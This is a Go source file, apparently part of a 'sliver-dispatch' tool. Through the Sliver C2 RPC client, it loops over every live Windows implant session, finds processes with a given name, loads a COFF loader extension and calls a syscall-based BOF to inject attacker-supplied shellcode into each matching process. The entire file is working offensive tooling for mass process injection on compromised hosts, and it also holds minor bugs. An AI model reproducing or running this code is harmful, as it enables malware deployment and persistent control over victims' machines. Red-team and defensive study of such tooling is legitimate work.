package dispatch

import (
	"context"
	"fmt"
	"log"
	"os"
	"slices"
	"sliver-dispatch/globals"
	"sliver-dispatch/utils"
	"sort"
	"strconv"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func Shinject(rpc rpcpb.SliverRPCClient, args ...string) {

	if len(args) < 2 {
		fmt.Println("Need the full path to shellcode and a system process name to inject to.")
		return
	}

	path_shc := args[0]
	processName := args[1]

	b_coff64, err := os.ReadFile("extensions/coff-loader/COFFLoader.x64.dll")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	b_coff32, err := os.ReadFile("extensions/coff-loader/COFFLoader.x86.dll")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	var sessions *clientpb.Sessions
	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}

	var session *clientpb.Session
	var ps_task *sliverpb.Ps
	var resp_l *sliverpb.ListExtensions
	var resp_r *sliverpb.RegisterExtension
	var resp_c *sliverpb.CallExtension
	var ldrCfg globals.ExtensionCfg
	var bofCfg globals.ExtensionCfg
	var extArgs []byte
	for _, session = range sessions.GetSessions() {
		var pids []int32
		if !session.IsDead && session.OS == "windows" {

			fmt.Println(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
				strings.Split(session.ID, "-")[0],
				session.Hostname,
				strings.Split(session.RemoteAddress, ":")[0],
				session.Username))

			ps_task, err = rpc.Ps(
				context.Background(),
				&sliverpb.PsReq{
					Request: &commonpb.Request{
						Async:     false,
						SessionID: session.ID,
					},
				})

			for _, p := range ps_task.Processes {
				if p.Executable == processName {
					pids = append(pids, p.Pid)
				}
			}

			if len(pids) == 0 {
				fmt.Println("Could not find a %s process!", processName)
				continue
			}

			for _, pid := range pids {
				utils.Dprint("%s pid: %d", processName, pid)

				resp_l, err = rpc.ListExtensions(
					context.Background(),
					&sliverpb.ListExtensionsReq{
						Request: &commonpb.Request{
							Async:     false,
							SessionID: session.ID,
						},
					},
				)

				if err != nil {
					fmt.Println("Error checking coff-loader is loaded into the session: " + err.Error())
				}

				if !slices.Contains(resp_l.Names, "coff-loader") {
					utils.Dprint("Registering coff-loader extension")
					if session.Arch == "amd64" {
						resp_r, err = rpc.RegisterExtension(
							context.Background(),
							&sliverpb.RegisterExtensionReq{
								Name: "coff-loader",
								OS:   "windows",
								Data: b_coff64,
								Request: &commonpb.Request{
									Async:     false,
									SessionID: session.ID,
								},
							},
						)
					} else {
						resp_r, err = rpc.RegisterExtension(
							context.Background(),
							&sliverpb.RegisterExtensionReq{
								Name: "coff-loader",
								OS:   "windows",
								Data: b_coff32,
								Request: &commonpb.Request{
									Async:     false,
									SessionID: session.ID,
								},
							},
						)
					}
					if resp_r != nil {
						fmt.Println(resp_r.Response.String())
					}
					if err != nil {
						fmt.Println("Error loading coff-loader extension to the session: " + err.Error())
					}
				}
				ldrCfg, err = utils.ParseExtCfg("extensions/coff-loader/extension.json")
				if err != nil {
					fmt.Println("Error parsing the coff-loader extension configuration: " + err.Error())
				}

				bofCfg, err = utils.ParseExtCfg("extensions/syscalls_shinject/extension.json")
				if err != nil {
					fmt.Println("Error parsing syscall_shinject extension configuration: " + err.Error())
				}
				extArgs, err = utils.GetBOFArgs(
					[]string{strconv.Itoa(int(pid)), path_shc},
					"extensions/"+bofCfg.Command_Name+"/"+bofCfg.Files[sort.Search(len(bofCfg.Files), func(i int) bool { return bofCfg.Files[i].Arch == session.Arch })].Path,
					bofCfg,
				)
				if err != nil {
					fmt.Println("Error parsing extension arguments: " + err.Error())
				}

				resp_c, err = rpc.CallExtension(
					context.Background(),
					&sliverpb.CallExtensionReq{
						Name:   ldrCfg.Command_Name,
						Export: ldrCfg.Entrypoint,
						Args:   extArgs,
						Request: &commonpb.Request{
							Async:     false,
							SessionID: session.ID,
						},
					},
				)

				if resp_c.Output != nil {
					fmt.Println("Response: " + string(resp_c.Output))
				}
				if err != nil {
					fmt.Println("Error: " + err.Error())
				}
				if resp_c.Response != nil {
					if resp_c.Response.Err != "" {
						fmt.Println("Error: " + resp_c.Response.Err)
					}
				}
			}

		}
	}
}
